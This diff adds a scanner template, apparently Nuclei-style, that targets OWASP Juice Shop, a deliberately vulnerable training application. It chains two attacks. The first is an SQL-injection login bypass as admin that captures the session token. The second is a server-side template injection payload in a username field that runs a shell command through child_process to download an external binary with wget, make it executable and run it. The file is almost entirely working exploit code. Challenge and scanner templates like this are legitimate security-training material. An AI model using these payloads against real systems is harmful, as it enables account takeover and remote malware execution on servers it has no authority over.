@@ -1,0 +1,47 @@
+id: juice-shop-ssti
+
+info:
+  name: SSTi
+  author: yelaco
+  severity: critical
+  tags: juice-shop,ssti
+  description: Infect the server with juicy malware by abusing arbitrary command execution
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "email": "admin@juice-sh.op'--",
+        "password": "irrelevant"
+      }
+
+    extractors:
+      - type: json
+        json:
+          - ".authentication.token"
+        internal: true # Makes the extracted value available to the next request
+        name: token
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Users"
+
+    headers:
+      Authorization: Bearer {{token}}
+      Content-Type: application/json
+
+    body: |
+      {
+        "username": "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}"
+      }
+
+    matchers:
+      - type: status
+        status:
+          - 200
